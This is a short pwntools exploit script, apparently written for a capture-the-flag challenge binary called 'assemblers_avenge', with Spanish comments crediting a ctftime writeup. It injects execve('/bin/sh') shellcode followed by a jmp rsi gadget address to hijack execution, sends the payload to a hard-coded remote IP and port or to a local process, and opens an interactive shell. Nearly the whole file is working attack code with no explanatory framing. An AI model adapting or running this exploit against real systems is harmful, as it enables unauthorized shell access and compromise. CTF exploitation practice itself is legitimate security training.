from pwn import *

gs = '''
b *_read+36
continue
'''

elf = context.binary = ELF("./assemblers_avenge")

def start():
    if args.REMOTE:
        return remote("94.237.57.27", 50273)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

jmp_rsi = p64(0x000000000040106b)

# Extraido de: https://ctftime.org/writeup/24007

# Cambias el mov edi, 0x00000 donde ese address es donde esta en string el /bin/sh buscalo en el mismo mensaje imprime eso xD

sc = asm("""
         mov edi, 0x402065
         xor esi, esi
         xor edx, edx
         mov eax, 0x3b
         syscall;
    """)

payload = b"".join([
    sc,
    jmp_rsi
])

io.send(payload)

io.interactive()